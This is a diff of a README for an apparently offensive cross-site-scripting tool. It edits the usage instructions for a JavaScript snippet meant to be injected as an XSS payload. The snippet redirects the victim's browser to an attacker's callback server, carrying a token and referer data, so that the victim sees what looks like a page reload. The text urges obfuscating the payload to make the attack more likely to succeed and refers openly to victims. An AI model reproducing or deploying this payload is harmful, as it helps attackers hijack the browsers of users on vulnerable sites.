@@ -10,11 +10,7 @@ When the attack is successful, the victim experienced what seemed like a page re
 
 ## Usage
 
-First of all make sure that your callback server is listening.
-
-Use the following code in your XSS payload. Be sure to change the address to that of your callback server, and change the token at the very least. The more you obfuscate this code, the higher your success rate will be. 
-
-Refine your payload as required, or it may get triggered unexpectedly.
+Use the following code in your XSS payload. Be sure to change the address to that of your callback server, and change the token at the very least. The more you obfuscate this code, the more likely your attack will succeed. 
 
 ```javascript
 const token = "w3lRZ87e";
@@ -24,4 +20,4 @@ if (location.hash != token) self.location = "https://mycallbackserver.net/callba
   "&token=" + encodeURIComponent( btoa(token) );
 ```
 
-<sup>If you choose not to include a referer in the URL parameters, the callback server defaults to the **`Referer`** header of the request.<br>If neither a referer parameter or Referer header is present, the panic address is used.</sup>
+<sup>If you choose not to include a referer in the URL parameters, the callback server defaults to the **`Referer`** header of the request.<br>If neither a referer parameter or Referer header is present, the victim is redirected to the panic address.</sup>
